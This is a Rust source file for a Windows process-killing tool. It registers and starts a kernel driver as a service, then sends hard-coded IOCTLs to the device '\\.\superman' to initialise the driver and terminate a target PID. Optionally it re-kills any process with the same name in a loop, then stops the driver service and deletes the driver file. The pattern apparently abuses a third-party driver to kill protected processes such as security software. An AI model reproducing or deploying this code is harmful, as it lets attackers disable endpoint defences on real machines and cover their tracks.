use crate::args::Args;
use crate::utils::{get_process_name, get_process_pid};
use anyhow::anyhow;
use std::cell::RefCell;
use std::ffi::{CStr, CString};
use std::mem::{size_of_val, zeroed};
use std::path::{Path, PathBuf};
use std::ptr::{addr_of, addr_of_mut, null, null_mut};
use std::sync::mpsc::Receiver;
use std::thread::sleep;
use std::time::Duration;
use std::{fs, process};
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, DELETE, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING,
};
use windows_sys::Win32::System::Services::{
    CloseServiceHandle, ControlService, CreateServiceA, DeleteService, OpenSCManagerA,
    OpenServiceA, QueryServiceStatus, StartServiceA, SC_MANAGER_ALL_ACCESS,
    SC_MANAGER_CREATE_SERVICE, SERVICE_CONTROL_STOP, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    SERVICE_KERNEL_DRIVER, SERVICE_RUNNING, SERVICE_START, SERVICE_STATUS, SERVICE_STOP,
    SERVICE_STOPPED,
};
use windows_sys::Win32::System::IO::DeviceIoControl;

/// Entry structure, representing a driver and its operations
pub struct Driver {
    path: PathBuf,
    service_name: CString,
}

impl Driver {
    pub fn new(path: PathBuf, service_name: CString) -> Self {
        Driver { path, service_name }
    }

    pub fn path(&self) -> &Path {
        &self.path
    }
    pub fn service_name(&self) -> &CStr {
        &self.service_name
    }

    /// Load and start driver
    pub fn load_driver(&self) -> anyhow::Result<()> {
        load_driver(self)
    }

    /// Unload and delete driver
    pub fn unload_driver(&self) -> anyhow::Result<()> {
        unload_driver(self)
    }

    /// Send ioctl to kill pid
    pub fn kill_pid(&self, args: &Args, rx: Receiver<bool>) -> anyhow::Result<()> {
        kill_pid(self, args, rx)
    }
}

/// Make sure driver status
fn check_service_status(driver: &Driver) -> anyhow::Result<bool> {
    unsafe {
        let scm = OpenSCManagerA(null(), null(), SC_MANAGER_CREATE_SERVICE);
        if scm == 0 {
            return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
        }

        let service = OpenServiceA(
            scm,
            driver.service_name().as_ptr().cast(),
            SC_MANAGER_ALL_ACCESS,
        );
        if service == 0 {
            CloseServiceHandle(scm);
            return Ok(false);
        }

        let mut status: SERVICE_STATUS = zeroed();

        let res = QueryServiceStatus(service, addr_of_mut!(status).cast());

        if res == FALSE {
            CloseServiceHandle(scm);
            CloseServiceHandle(service);
            return Err(anyhow!("[-]QueryServiceStatus failed {}!", GetLastError()));
        }

        match status.dwCurrentState {
            SERVICE_RUNNING => Ok(true),
            SERVICE_STOPPED => {
                let res = StartServiceA(service, 0, null());
                if res == FALSE {
                    CloseServiceHandle(scm);
                    CloseServiceHandle(service);
                    return Err(anyhow!("[-]StartServiceA failed {}!", GetLastError()));
                };

                Ok(true)
            }
            _ => {
                driver.unload_driver()?;
                Ok(false)
            }
        }
    }
}

fn load_driver(driver: &Driver) -> anyhow::Result<()> {
    if check_service_status(driver)? {
        return Ok(());
    }

    let path = CString::new(driver.path().to_string_lossy().as_ref())?;

    unsafe {
        let scm = OpenSCManagerA(null(), null(), SC_MANAGER_CREATE_SERVICE);
        if scm == 0 {
            return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
        }

        let service = CreateServiceA(
            scm,
            driver.service_name().as_ptr().cast(),
            driver.service_name().as_ptr().cast(),
            SERVICE_START | DELETE | SERVICE_STOP,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            path.as_ptr().cast(),
            null(),
            null_mut(),
            null(),
            null(),
            null(),
        );

        if service == 0 {
            CloseServiceHandle(scm);
            return Err(anyhow!("[-]CreateServiceA failed {}!", GetLastError()));
        }

        println!("[+]Service created successfully!");

        let res = StartServiceA(service, 0, null());

        // Last use of these service handle
        CloseServiceHandle(scm);
        CloseServiceHandle(service);

        if res == FALSE {
            return Err(anyhow!("[-]StartServiceA failed {}!", GetLastError()));
        }

        println!("[+]Driver loaded successfully!");
    }

    Ok(())
}

fn unload_driver(driver: &Driver) -> anyhow::Result<()> {
    let mut status: SERVICE_STATUS = unsafe { zeroed() };

    unsafe {
        let scm = OpenSCManagerA(null(), null(), SC_MANAGER_CREATE_SERVICE);
        if scm == 0 {
            return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
        }

        let service = OpenServiceA(
            scm,
            driver.service_name().as_ptr().cast(),
            SC_MANAGER_ALL_ACCESS,
        );
        if service == 0 {
            CloseServiceHandle(scm);
            return Err(anyhow!("[-]OpenServiceA failed {}!", GetLastError()));
        }

        let res = ControlService(service, SERVICE_CONTROL_STOP, addr_of_mut!(status));
        if res == FALSE {
            CloseServiceHandle(scm);
            CloseServiceHandle(service);

            return Err(anyhow!("[-]ControlService failed {}!", GetLastError()));
        }

        let res = DeleteService(service);

        // Last use of these service handle
        CloseServiceHandle(scm);
        CloseServiceHandle(service);

        if res == FALSE {
            return Err(anyhow!("[-]DeleteService failed {}!", GetLastError()));
        }
    }

    fs::remove_file(driver.path())?;

    Ok(())
}

fn kill_pid(driver: &Driver, args: &Args, rx: Receiver<bool>) -> anyhow::Result<()> {
    let initialize_ioctl_code: u32 = 0x9876C004u32;
    let terminate_process_ioctl_code: u32 = 0x9876C094u32;
    let device_name = CStr::from_bytes_with_nul(b"\\\\.\\superman\0")?;
    let pid = args.pid;
    let mut output = 0u64;

    unsafe {
        let device = CreateFileA(
            device_name.as_ptr().cast(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if device == INVALID_HANDLE_VALUE {
            return Err(anyhow!("[-]CreateFileA failed {}!", GetLastError()));
        }

        // DeviceIoControl function
        let device_io_control = RefCell::new(|control_code: u32, pid: u32| {
            let res = DeviceIoControl(
                device,
                control_code,
                addr_of!(pid).cast(),
                u32::try_from(size_of_val(&pid))?,
                addr_of_mut!(output).cast(),
                u32::try_from(size_of_val(&output))?,
                null_mut(),
                null_mut(),
            );
            if res == FALSE {
                return Err(anyhow!("[-]DeviceIoControl failed {}!", GetLastError()));
            }

            Ok(())
        });

        let kill = |pid| {
            if device_io_control.borrow_mut()(terminate_process_ioctl_code, pid).is_ok() {
                println!("[+]Process {} has been terminated!", pid)
            }
        };

        // Init driver
        device_io_control.borrow_mut()(initialize_ioctl_code, pid)?;
        println!("[+]Driver initialized {:#x}!", initialize_ioctl_code);

        if args.recursive {
            let name = get_process_name(pid);

            loop {
                // exit
                if rx.try_recv().is_ok() {
                    CloseHandle(device);
                    driver.unload_driver()?;
                    process::exit(0i32);
                }

                if let Some(pid) = get_process_pid(&name) {
                    kill(pid);
                }

                sleep(Duration::from_millis(args.time));
            }
        }

        kill(pid);
        CloseHandle(device);
    }

    Ok(())
}
